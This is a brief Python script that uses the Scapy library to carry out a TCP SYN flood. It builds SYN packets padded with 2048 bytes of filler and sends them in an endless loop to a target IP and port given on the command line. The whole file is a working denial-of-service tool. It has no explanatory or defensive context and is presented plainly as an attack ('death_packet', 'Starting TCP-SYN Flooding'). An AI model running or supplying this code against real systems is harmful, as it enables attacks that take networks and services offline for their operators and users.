#!/usr/bin/env python3

#Import Scapy
from scapy.all import *
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", type=str, dest="target", required=True, help="Choose the target IP for attack")
    parser.add_argument("-i", type=str, dest="interface", required=True, help="Choose the interface")
    parser.add_argument("-p", type=int, dest="port", required=True, help="Choose the target port")
    args = parser.parse_args()

    return args
    


def flooding(interface, target, port):
    ip = IP(dst=args.target, id=1111, ttl=99)
    tcp_segment = TCP(sport=RandShort(), dport=args.port, seq=1505066, ack=1000, flags="S")
    raw_data = Raw(b"A"*2048) #add some raw data to occupy the network
    death_packet = ip/tcp_segment/raw_data
    death_packet.show()
    print ("Starting TCP-SYN Flooding...")
    send(death_packet, iface=args.interface, loop=1, verbose=1)


args = get_arguments()
flooding(args.interface, args.target, args.port)

